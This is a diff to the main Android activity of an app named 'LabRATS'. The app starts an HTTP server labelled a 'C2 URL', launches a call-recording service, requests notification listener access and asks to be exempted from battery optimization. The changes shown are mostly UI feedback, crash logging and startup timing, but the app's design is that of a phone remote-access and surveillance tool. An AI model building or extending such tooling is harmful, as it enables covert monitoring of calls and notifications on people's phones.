@@ -41,18 +41,28 @@ public class MainActivity extends AppCompatActivity {
     private static final int MANAGE_STORAGE_REQUEST_CODE = 1002;
     private static final ExecutorService ipLookupExecutor = Executors.newSingleThreadExecutor();
 
-    private TextView tvStatus;
-    private TextView tvIpAddress;
-    private TextView tvServerUrl;
+    private TextView tvStatus, tvIpAddress, tvServerUrl, tvTerminalFeedback;
     private MaterialButton btnStartStop;
     private MaterialButton btnCopyUrl;
     private MaterialButton btnBatteryOptimization;
     private boolean isServerRunning = false;
+    private long lastIpLookupTime = 0;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        
+        // --- EMERGENCY CRASH LOGGER ---
+        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
+            Log.e("LabRATS-FATAL", "CRASH_DETECTED: " + throwable.getMessage(), throwable);
+            LabRatsHttpServer.logActivity("CRITICAL_CORE_FAILURE: " + throwable.getClass().getSimpleName());
+            // Attempt to save logs before dying
+            try { Thread.sleep(500); } catch (Exception ignored) {}
+            android.os.Process.killProcess(android.os.Process.myPid());
+            System.exit(10);
+        });
 
+        setContentView(R.layout.activity_main);
         initViews();
         requestPermissions();
         updateUI();
@@ -70,30 +80,57 @@ public class MainActivity extends AppCompatActivity {
         btnStartStop = findViewById(R.id.btnStartStop);
         btnCopyUrl = findViewById(R.id.btnCopyUrl);
         btnBatteryOptimization = findViewById(R.id.btnBatteryOptimization);
-
-        // Explicitly set colors to override potential theme defaults
-        btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_cyan)));
-        btnStartStop.setTextColor(getColor(R.color.bg_dark));
-        
-        btnCopyUrl.setStrokeColor(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_cyan)));
-        btnCopyUrl.setTextColor(getColor(R.color.neon_cyan));
-        
-        btnBatteryOptimization.setTextColor(getColor(R.color.neon_cyan));
+        tvTerminalFeedback = findViewById(R.id.tvTerminalFeedback);
 
         btnStartStop.setOnClickListener(v -> toggleServer());
 
-        findViewById(R.id.btnCopyUrl).setOnClickListener(v -> {
+        btnCopyUrl.setOnClickListener(v -> {
+            Log.d("MainActivity", "Copy URL protocol initiated");
             String url = tvServerUrl.getText().toString();
-            if (!url.isEmpty() && !url.equals("Not running")) {
-                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(
-                        CLIPBOARD_SERVICE);
-                android.content.ClipData clip = android.content.ClipData.newPlainText("Server URL", url);
-                clipboard.setPrimaryClip(clip);
-                Toast.makeText(this, "URL copied to clipboard!", Toast.LENGTH_SHORT).show();
+            
+            if (url != null && url.startsWith("http")) {
+                try {
+                    android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+                    android.content.ClipData clip = android.content.ClipData.newPlainText("LabRATS C2 URL", url);
+                    clipboard.setPrimaryClip(clip);
+                    
+                    // Button Feedback (Cyber Green)
+                    btnCopyUrl.setText("✅ URL_COPIED");
+                    btnCopyUrl.setTextColor(getColor(R.color.neon_green));
+                    btnCopyUrl.setStrokeColor(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_green)));
+                    btnCopyUrl.postDelayed(() -> {
+                        btnCopyUrl.setText("COPY LINK");
+                        btnCopyUrl.setTextColor(getColor(R.color.neon_cyan));
+                        btnCopyUrl.setStrokeColor(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_cyan)));
+                    }, 2000);
+
+                    // Console feedback
+                    tvTerminalFeedback.setText("[ ✅ SUCCESS: URL_CLONED_TO_CLIPBOARD ]");
+                    tvTerminalFeedback.setTextColor(getColor(R.color.neon_green));
+                    
+                } catch (Exception e) {
+                    Log.e("MainActivity", "Clipboard failure: " + e.getMessage());
+                    tvTerminalFeedback.setText("[ ❌ CLIPBOARD_ACCESS_DENIED ]");
+                    tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
+                }
+            } else {
+                tvTerminalFeedback.setText("[ ⚠️ UPLINK_INACTIVE: NOTHING_TO_COPY ]");
+                tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
             }
         });
 
-        findViewById(R.id.btnBatteryOptimization).setOnClickListener(v -> {
+        btnBatteryOptimization.setOnClickListener(v -> {
+            Log.d("MainActivity", "Bypass limits protocol initiated");
+            
+            btnBatteryOptimization.setText("INITIATING_BYPASS...");
+            btnBatteryOptimization.setTextColor(getColor(R.color.neon_red));
+            btnBatteryOptimization.postDelayed(() -> {
+                if (btnBatteryOptimization.getText().toString().contains("INITIATING")) {
+                    btnBatteryOptimization.setText("BYPASS_POWER_LIMITS");
+                    btnBatteryOptimization.setTextColor(getColor(R.color.neon_cyan));
+                }
+            }, 3000);
+
             requestBatteryOptimization();
         });
 
@@ -101,40 +138,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startGlitchAnimation() {
+        // [STABILITY_PATCH] Disabled aggressive animation to prevent Accessibility Service floods
+        // which were causing phone freezes and ANRs on some devices.
         TextView tvDevelopedBy = findViewById(R.id.tvDevelopedBy);
-        
-        ValueAnimator animator = ValueAnimator.ofFloat(0f, 1f);
-        animator.setDuration(5000);
-        animator.setRepeatCount(ValueAnimator.INFINITE);
-        animator.setInterpolator(new LinearInterpolator());
-        
-        animator.addUpdateListener(animation -> {
-            // Very low frequency glitches (5% chance per "frame")
-            if (Math.random() < 0.05) {
-                float xShift = (float) (Math.random() * 6 - 3);
-                int color = Math.random() > 0.5 ? 0xFF00f2ff : 0xFFFF3131;
-                
-                tvDevelopedBy.setTranslationX(xShift);
-                tvDevelopedBy.setTextColor(color);
-                tvDevelopedBy.setAlpha((float) (0.8 + Math.random() * 0.2));
-            } 
-            else {
-                // Calm state
-                tvDevelopedBy.setTranslationX(0);
-                tvDevelopedBy.setTextColor(0xFF00f2ff);
-                tvDevelopedBy.setAlpha(0.9f);
-                tvDevelopedBy.setScaleX(1.0f);
-                tvDevelopedBy.setScaleY(1.0f);
-            }
-        });
-        
-        animator.start();
+        tvDevelopedBy.setTextColor(0xFF00f2ff);
+        tvDevelopedBy.setAlpha(0.9f);
     }
 
     private void requestPermissions() {
         List<String> permissionsNeeded = new ArrayList<>();
 
-        // Check if Notification Access is granted
+        // Check if Notification Access is granted (Accessibility/Listener, not popups)
         if (!isNotificationServiceEnabled()) {
             try {
                 Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
@@ -269,14 +283,44 @@ public class MainActivity extends AppCompatActivity {
 
     private void requestBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivity(intent);
-            } else {
-                Toast.makeText(this, "Battery optimization already disabled", Toast.LENGTH_SHORT).show();
+            try {
+                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Log.d("MainActivity", "Requesting battery optimization bypass");
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                } else if (pm != null) {
+                    Log.d("MainActivity", "Battery optimization already disabled");
+                    
+                    btnBatteryOptimization.setText("✅ BYPASS_ACTIVE");
+                    btnBatteryOptimization.setTextColor(getColor(R.color.neon_green));
+                    btnBatteryOptimization.postDelayed(() -> {
+                        btnBatteryOptimization.setText("BYPASS_POWER_LIMITS");
+                        btnBatteryOptimization.setTextColor(getColor(R.color.neon_cyan));
+                    }, 2000);
+
+                    tvTerminalFeedback.setText("[ ✅ BYPASS_PROTOCOL_ALREADY_ACTIVE ]");
+                    tvTerminalFeedback.setTextColor(getColor(R.color.neon_green));
+                }
+            } catch (Exception e) {
+                Log.e("MainActivity", "Battery optimization protocol failure: " + e.getMessage());
+                try {
+                    // Fallback to manual selection screen
+                    tvTerminalFeedback.setText("[ 📡 REDIRECTING_TO_SYSTEM_SETTINGS... ]");
+                    tvTerminalFeedback.setTextColor(getColor(R.color.neon_cyan));
+                    Toast.makeText(getApplicationContext(), "Redirecting to system battery settings...", Toast.LENGTH_SHORT).show();
+                    startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
+                } catch (Exception e2) {
+                    Log.e("MainActivity", "Critical failure in protocol fallback: " + e2.getMessage());
+                    tvTerminalFeedback.setText("[ ❌ PROTOCOL_FAILURE ]");
+                    tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
+                    Toast.makeText(getApplicationContext(), "❌ PROTOCOL_FAILURE", Toast.LENGTH_LONG).show();
+                }
             }
+        } else {
+            tvTerminalFeedback.setText("[ ℹ️ LEGACY_OS: POWER_LIMITS_NOT_ENFORCED ]");
+            Toast.makeText(getApplicationContext(), "ℹ️ LEGACY_OS: OK", Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -307,10 +351,18 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void toggleServer() {
+    private synchronized void toggleServer() {
+        if (btnStartStop == null || !btnStartStop.isEnabled()) return;
+        
         if (isServerRunning) {
+            Log.d("MainActivity", "Terminating server protocol");
+            tvTerminalFeedback.setText("[ 🔴 TERMINATING_UPLINK... ]");
+            tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
             stopServer();
         } else {
+            Log.d("MainActivity", "Initializing server protocol");
+            tvTerminalFeedback.setText("[ 📡 INITIALIZING_UPLINK... ]");
+            tvTerminalFeedback.setTextColor(getColor(R.color.neon_cyan));
             startServer();
         }
     }
@@ -322,28 +374,35 @@ public class MainActivity extends AppCompatActivity {
         Intent serviceIntent = new Intent(this, HttpServerService.class);
         serviceIntent.setAction("START");
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-
-        Intent callServiceIntent = new Intent(this, CallRecordService.class);
-        callServiceIntent.setAction("START_SERVICE");
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(callServiceIntent);
+                startForegroundService(serviceIntent);
             } else {
-                startService(callServiceIntent);
+                startService(serviceIntent);
             }
         } catch (Exception e) {
-            Log.e("MainActivity", "Error starting CallRecordService: " + e.getMessage());
+            Log.e("MainActivity", "Server start error: " + e.getMessage());
         }
+
+        // Staggered Startup: Prevent hardware contention
+        btnStartStop.postDelayed(() -> {
+            Intent callServiceIntent = new Intent(this, CallRecordService.class);
+            callServiceIntent.setAction("START_SERVICE");
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(callServiceIntent);
+                } else {
+                    startService(callServiceIntent);
+                }
+            } catch (Exception e) {
+                Log.e("MainActivity", "Error starting CallRecordService: " + e.getMessage());
+            }
+        }, 1500);
 
         btnStartStop.postDelayed(() -> {
             btnStartStop.setEnabled(true);
             updateUI();
-        }, 1500);
+        }, 3000);
     }
 
     private void stopServer() {
@@ -353,6 +412,10 @@ public class MainActivity extends AppCompatActivity {
         Intent serviceIntent = new Intent(this, HttpServerService.class);
         serviceIntent.setAction("STOP");
         startService(serviceIntent);
+
+        // Terminate accompanying services
+        Intent callServiceIntent = new Intent(this, CallRecordService.class);
+        stopService(callServiceIntent);
 
         btnStartStop.postDelayed(() -> {
             btnStartStop.setEnabled(true);
@@ -372,31 +435,21 @@ public class MainActivity extends AppCompatActivity {
             btnStartStop.setText("TERMINATE UPLINK");
             btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_red)));
             btnStartStop.setTextColor(getColor(R.color.white));
+            
+            btnCopyUrl.setEnabled(true);
+            btnCopyUrl.setAlpha(1.0f);
 
             tvIpAddress.setText("SYNCING_NETWORK_DATA...");
             tvServerUrl.setText("GENERATING_BRIDGE...");
 
-            getPublicIPv6Async(publicIp -> {
-                String localIp = getLocalIpAddress();
-                runOnUiThread(() -> {
-                    StringBuilder ipText = new StringBuilder();
-                    if (localIp != null) ipText.append("LOCAL: ").append(localIp);
-                    if (publicIp != null && !publicIp.equals(localIp)) {
-                        if (ipText.length() > 0) ipText.append("\n");
-                        ipText.append("GLOBAL: ").append(publicIp);
-                    }
-                    
-                    if (ipText.length() == 0) {
-                        tvIpAddress.setText("ADDR: NO_CONNECTION");
-                        tvServerUrl.setText("RETRYING_HANDSHAKE...");
-                    } else {
-                        tvIpAddress.setText(ipText.toString());
-                        String displayIp = (localIp != null) ? localIp : publicIp;
-                        String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:8080" : "http://" + displayIp + ":8080";
-                        tvServerUrl.setText(formattedUrl);
-                    }
-                });
-            });
+            long now = System.currentTimeMillis();
+            if (now - lastIpLookupTime < 10000) {
+                updateIpDisplay(null); 
+                return;
+            }
+            
+            lastIpLookupTime = now;
+            getPublicIPv6Async(this::updateIpDisplay);
 
         } else {
             tvStatus.setText("🔴 SERVER_OFFLINE");
@@ -404,9 +457,36 @@ public class MainActivity extends AppCompatActivity {
             btnStartStop.setText("INITIALIZE SERVER");
             btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_cyan)));
             btnStartStop.setTextColor(getColor(R.color.bg_dark));
+            
+            btnCopyUrl.setEnabled(false);
+            btnCopyUrl.setAlpha(0.5f);
+            
             tvServerUrl.setText("UPLINK_INACTIVE");
             tvIpAddress.setText("ADDR: STANDBY_MODE");
+            lastIpLookupTime = 0;
         }
+    }
+
+    private void updateIpDisplay(String publicIp) {
+        String localIp = getLocalIpAddress();
+        runOnUiThread(() -> {
+            StringBuilder ipText = new StringBuilder();
+            if (localIp != null) ipText.append("LOCAL: ").append(localIp);
+            if (publicIp != null && !publicIp.equals(localIp)) {
+                if (ipText.length() > 0) ipText.append("\n");
+                ipText.append("GLOBAL: ").append(publicIp);
+            }
+            
+            if (ipText.length() == 0) {
+                tvIpAddress.setText("ADDR: NO_CONNECTION");
+                tvServerUrl.setText("RETRYING_HANDSHAKE...");
+            } else {
+                tvIpAddress.setText(ipText.toString());
+                String displayIp = (localIp != null) ? localIp : publicIp;
+                String formattedUrl = isIPv6(displayIp) ? "http://[" + displayIp + "]:8080" : "http://" + displayIp + ":8080";
+                tvServerUrl.setText(formattedUrl);
+            }
+        });
     }
 
     public interface IpCallback { void onResult(String ip); }
